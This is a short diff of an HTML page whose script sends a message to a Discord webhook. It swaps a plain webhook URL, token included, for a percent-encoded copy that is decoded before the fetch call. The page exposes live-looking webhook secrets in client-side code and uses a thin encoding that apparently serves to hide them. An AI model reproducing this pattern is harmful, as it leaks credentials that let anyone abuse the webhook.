@@ -1,5 +1,6 @@
 <html>
   <head>
+   <meta charset="utf-8">
     <style>
       body {
         font-family: sans-serif;
@@ -88,10 +89,10 @@
       document.getElementById("error").innerHTML = "";
 
       // Set the webhook URL
-      var webhook = "https://discord.com/api/webhooks/1057464379483881482/awNmKzi905qo0xNf5lHlf1bCRmhJa9qL5-7IVQIE4bHdom6BWcAz-G1m9j6l7wnr_Xp1";
-
+      var webhook = "https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1057654784380907530%2FmrcIj0YV9SZWQL4t069wRIUJclsoo7tgocpAPjtQI9Mzj29zxaC5NUs97_l_bv_2DLLa";
+var decodedString = decodeURIComponent(webhook);
       // Send the message to the Discord server using the webhook
-      fetch(webhook, {
+      fetch(decodedString, {
         method: 'POST',
         
         headers: {
@@ -106,4 +107,3 @@
     }
   </script>
 </html>
-
